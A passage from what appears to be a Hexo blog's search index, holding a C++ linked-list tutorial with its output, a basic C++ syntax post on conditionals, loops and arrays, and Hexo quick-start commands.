class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Define the Node structure</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    Node* next;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Constructor</span></span><br><span class="line">    <span class="built_in">Node</span>(<span class="type">int</span> val) : <span class="built_in">data</span>(val), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Define the LinkedList class</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkedList</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Node* head;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// Constructor</span></span><br><span class="line">    <span class="built_in">LinkedList</span>() : <span class="built_in">head</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Function to insert a node at the front of the list</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insertFront</span><span class="params">(<span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Create a new node</span></span><br><span class="line">        Node* newNode = <span class="keyword">new</span> <span class="built_in">Node</span>(val);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Make the new node point to the current head</span></span><br><span class="line">        newNode-&gt;next = head;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Update the head to point to the new node</span></span><br><span class="line">        head = newNode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Function to insert a node at the back of the list</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insertBack</span><span class="params">(<span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Create a new node</span></span><br><span class="line">        Node* newNode = <span class="keyword">new</span> <span class="built_in">Node</span>(val);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// If the list is empty, make the new node the head</span></span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            head = newNode;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Traverse to the end of the list</span></span><br><span class="line">        Node* current = head;</span><br><span class="line">        <span class="keyword">while</span> (current-&gt;next != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            current = current-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Make the last node point to the new node</span></span><br><span class="line">        current-&gt;next = newNode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Function to delete a node from the front of the list</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">deleteFront</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Check if the list is empty</span></span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;List is empty. Cannot delete from an empty list.&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Store a pointer to the current head</span></span><br><span class="line">        Node* temp = head;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the head to point to the next node</span></span><br><span class="line">        head = head-&gt;next;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete the original head node</span></span><br><span class="line">        <span class="keyword">delete</span> temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Function to delete a node from the back of the list</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">deleteBack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Check if the list is empty</span></span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;List is empty. Cannot delete from an empty list.&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If the list has only one node, delete it</span></span><br><span class="line">        <span class="keyword">if</span> (head-&gt;next == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">delete</span> head;</span><br><span class="line">            head = <span class="literal">nullptr</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Traverse to the second-to-last node</span></span><br><span class="line">        Node* current = head;</span><br><span class="line">        <span class="keyword">while</span> (current-&gt;next-&gt;next != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            current = current-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete the last node</span></span><br><span class="line">        <span class="keyword">delete</span> current-&gt;next;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Set the next pointer of the second-to-last node to null</span></span><br><span class="line">        current-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Function to display the linked list</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">display</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Node* current = head;</span><br><span class="line">        <span class="keyword">while</span> (current != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            cout &lt;&lt; current-&gt;data &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            current = current-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Create a LinkedList object</span></span><br><span class="line">    LinkedList list;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Test</span></span><br><span class="line">    list.<span class="built_in">insertFront</span>(<span class="number">3</span>);</span><br><span class="line">    list.<span class="built_in">insertFront</span>(<span class="number">2</span>);</span><br><span class="line">    list.<span class="built_in">insertFront</span>(<span class="number">1</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;List after inserting at the front: &quot;</span>;</span><br><span class="line">    list.<span class="built_in">display</span>();</span><br><span class="line"></span><br><span class="line">    list.<span class="built_in">deleteFront</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;List after deleting from the front: &quot;</span>;</span><br><span class="line">    list.<span class="built_in">display</span>();</span><br><span class="line"></span><br><span class="line">    list.<span class="built_in">insertBack</span>(<span class="number">4</span>);</span><br><span class="line">    list.<span class="built_in">insertBack</span>(<span class="number">5</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;List after inserting at the back: &quot;</span>;</span><br><span class="line">    list.<span class="built_in">display</span>();</span><br><span class="line"></span><br><span class="line">    list.<span class="built_in">deleteBack</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;List after deleting from the back: &quot;</span>;</span><br><span class="line">    list.<span class="built_in">display</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="output"><a href="#output" class="headerlink" title="output"></a>output</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">List after inserting at the front: 1 2 3 </span><br><span class="line">List after deleting from the front: 2 3</span><br><span class="line">List after inserting at the back: 2 3 4 5</span><br><span class="line">List after deleting from the back: 2 3 4</span><br></pre></td></tr></table></figure></details>]]></content>
      
      
      <categories>
          
          <category> Data structure </category>
          
      </categories>
      
      
        <tags>
            
            <tag> data structure </tag>
            
            <tag> linked list </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Basic C++</title>
      <link href="/2024/03/11/Basic-C/"/>
      <url>/2024/03/11/Basic-C/</url>
      
        <content type="html"><![CDATA[<h1 id="Selection-Structure"><a href="#Selection-Structure" class="headerlink" title="Selection Structure"></a>Selection Structure</h1><h2 id="if-statement"><a href="#if-statement" class="headerlink" title="if statement"></a>if statement</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(condition)&#123;</span><br><span class="line">    <span class="comment">// Code to execute if condition is true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="if-else-statement"><a href="#if-else-statement" class="headerlink" title="if-else statement"></a>if-else statement</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(condition)&#123;</span><br><span class="line">    <span class="comment">// Code to execute if condition is true</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// Code to execute if condition is false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="multiple-selection-structure"><a href="#multiple-selection-structure" class="headerlink" title="multiple selection structure"></a>multiple selection structure</h1><h2 id="if-else-else-statement"><a href="#if-else-else-statement" class="headerlink" title="if-else-else statement"></a>if-else-else statement</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(condition1)&#123;</span><br><span class="line">    <span class="comment">// Code to execute if condition1 is true</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(condition2)&#123;</span><br><span class="line">    <span class="comment">// Code to execute if condition1 is false and condition2 is true</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// Code to execute if both condition1 and condition2 are false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="switch-case"><a href="#switch-case" class="headerlink" title="switch case"></a>switch case</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(variable)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment">// Code to execute if variable equals 1</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="comment">// Code to execute if variable equals 2</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// Code to execute if variable doesn&#x27;t equal any of the above cases</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Loop"><a href="#Loop" class="headerlink" title="Loop"></a>Loop</h1><h2 id="while-loop"><a href="#while-loop" class="headerlink" title="while loop"></a>while loop</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(condition)&#123;</span><br><span class="line">    <span class="comment">// Code to execute as long as condition is true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="for-loop"><a href="#for-loop" class="headerlink" title="for loop"></a>for loop</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(initialization; condition; increment)&#123;</span><br><span class="line">    <span class="comment">// Code to execute for each loop iteration</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="array"><a href="#array" class="headerlink" title="array"></a>array</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dataType arrayName[arraySize];</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">5</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>&#125;; <span class="comment">// Initialize the first two elements of the array to 0 and 1, the rest will be default initialized to 0</span></span><br><span class="line"><span class="comment">// a = &#123;0, 1, 0, 0, 0&#125;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">    a[i] = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// a = &#123;0, 1, 2, 3, 4&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Basic C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> if </tag>
            
            <tag> loop </tag>
            
            <tag> array </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo setup</title>
      <link href="/2024/03/10/Hexo%20setup/"/>
      <url>/2024/03/10/Hexo%20setup/</url>
      
        <content type="html"><![CDATA[<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
